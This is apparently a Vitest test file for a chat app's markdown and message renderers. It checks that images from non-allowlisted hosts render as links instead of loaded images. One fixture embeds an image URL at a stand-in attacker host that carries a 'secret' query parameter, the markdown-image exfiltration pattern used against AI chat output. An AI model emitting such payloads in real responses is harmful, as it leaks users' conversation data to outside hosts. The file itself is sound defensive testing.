import { createElement, type ReactNode } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { afterEach, describe, expect, test, vi } from 'vitest';

vi.mock('@/components/providers/auth-provider', () => ({ useAuth: () => ({ user: null }) }));
vi.mock('@/components/theme-provider', () => ({ useTheme: () => ({ theme: 'light', resolvedTheme: 'light' }) }));
vi.mock('@/components/providers/text-size-provider', () => ({ useTextSize: () => ({ textSize: 'default' }) }));
vi.mock('@/components/providers/font-provider', () => ({ useFont: () => ({ fontFamily: 'inter' }) }));
vi.mock('@/components/providers/artifact-provider', () => ({ useArtifact: () => ({ openArtifact: () => {} }) }));
vi.mock('@/components/providers/model-provider', () => ({ useModel: () => ({ selectedModel: 'test/model' }) }));
vi.mock('@/components/providers/language-provider', () => ({
  useLanguage: () => ({ language: 'en', setLanguage: () => {}, t: (key: string) => key }),
}));
vi.mock('@/components/ui/use-toast', () => ({ useToast: () => ({ toast: () => {} }) }));
vi.mock('@/components/providers/sources-provider', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/components/providers/sources-provider')>();
  return {
    ...actual,
    useSources: () => ({
      sources: [],
      setSources: () => {},
      isSourcesOpen: false,
      trackedSetIsSourcesOpen: () => {},
      hasAvailableSources: false,
    }),
  };
});

const ATTACKER = 'https://attacker.example/x.png?q=secret';
const REPLICATE = 'https://replicate.delivery/xezq/a.png';
const STORAGE = 'https://project-ref.supabase.example/storage/v1/object/public/bucket/a.png';
const attackerMd = `Answer ![alt](${ATTACKER}) done.`;
const replicateMd = `Answer ![alt](${REPLICATE}) done.`;

async function loadModules(allowlist: string | undefined) {
  vi.resetModules();
  vi.stubEnv('NEXT_PUBLIC_SUPABASE_URL', 'https://project-ref.supabase.example');
  if (allowlist === undefined) {
    vi.stubEnv('NEXT_PUBLIC_RAG_IMAGE_ALLOWLIST', '');
  } else {
    vi.stubEnv('NEXT_PUBLIC_RAG_IMAGE_ALLOWLIST', allowlist);
  }
  const { Markdown } = await import('@/components/ui/markdown');
  const { ChatMessage } = await import('@/components/ui/chat-message');
  const renderMarkdown = (text: string) =>
    renderToStaticMarkup(createElement(Markdown as never, { children: text }) as ReactNode as never);
  const renderChat = (text: string) =>
    renderToStaticMarkup(
      createElement(ChatMessage as never, {
        message: { id: 'm-1', role: 'assistant', parts: [], content: [{ type: 'text', text }] },
        isLastMessage: false,
      }) as ReactNode as never,
    );
  return { renderMarkdown, renderChat };
}

const escaped = (url: string) => url.replace(/&/g, '&amp;');
const imgTags = (html: string) => (html.match(/<img\b[^>]*>/g) ?? []).filter((tag) => tag.includes('alt="alt"') || tag.includes('example') || tag.includes('replicate'));
const anchorFor = (html: string, url: string) =>
  html.match(new RegExp(`<a\\b[^>]*href="${escaped(url).replace(/[.?*+^$()[\]{}|\\/]/g, '\\$&')}"[^>]*>(.*?)</a>`));

afterEach(() => {
  vi.unstubAllEnvs();
});

describe.each(['chat-message', 'markdown'] as const)('%s renderer', (which) => {
  const pick = (m: Awaited<ReturnType<typeof loadModules>>) => (which === 'markdown' ? m.renderMarkdown : m.renderChat);

  test('switch on: an image from an unknown host renders as a link and no img', async () => {
    const render = pick(await loadModules('true'));
    const html = render(attackerMd);
    expect(imgTags(html)).toEqual([]);
    const anchor = anchorFor(html, ATTACKER);
    expect(anchor).not.toBeNull();
    const rel = anchor![0].match(/rel="([^"]*)"/)?.[1].split(/\s+/) ?? [];
    expect(rel).toEqual(expect.arrayContaining(['noopener', 'noreferrer', 'nofollow']));
    expect(anchor![1]).toBe('alt');
    expect(html).not.toContain(`src="${escaped(ATTACKER)}"`);
  });

  test('switch on: an image without alt text shows its URL as the link text', async () => {
    const render = pick(await loadModules('true'));
    const html = render(`![](${ATTACKER})`);
    expect(imgTags(html)).toEqual([]);
    expect(anchorFor(html, ATTACKER)?.[1]).toBe(escaped(ATTACKER));
  });

  test('switch on: a non-http image source renders as text with no link and no img', async () => {
    const render = pick(await loadModules('true'));
    const html = render('![alt](data:image/png;base64,AAAA)');
    expect(imgTags(html)).toEqual([]);
    expect(html).not.toContain('data:image');
    expect(html).not.toMatch(/<a\b/);
    expect(html).toContain('alt');
  });

  test('switch on: allowlisted images render as img with no-referrer and lazy loading', async () => {
    const render = pick(await loadModules('true'));
    for (const url of [REPLICATE, STORAGE, '/api/files/x.png']) {
      const tags = imgTags(render(`![alt](${url})`));
      expect(tags).toHaveLength(1);
      expect(tags[0]).toContain(`src="${url}"`);
      expect(tags[0]).toContain('referrerPolicy="no-referrer"');
      expect(tags[0]).toContain('loading="lazy"');
      expect(tags[0]).toContain('alt="alt"');
    }
  });

  test.each([undefined, 'false', 'TRUE', '1'])('switch %j: images render exactly as today', async (value) => {
    const render = pick(await loadModules(value));
    expect(imgTags(render(attackerMd))).toEqual([`<img src="${escaped(ATTACKER)}" alt="alt"/>`]);
    expect(imgTags(render(replicateMd))).toEqual([`<img src="${REPLICATE}" alt="alt"/>`]);
  });
});
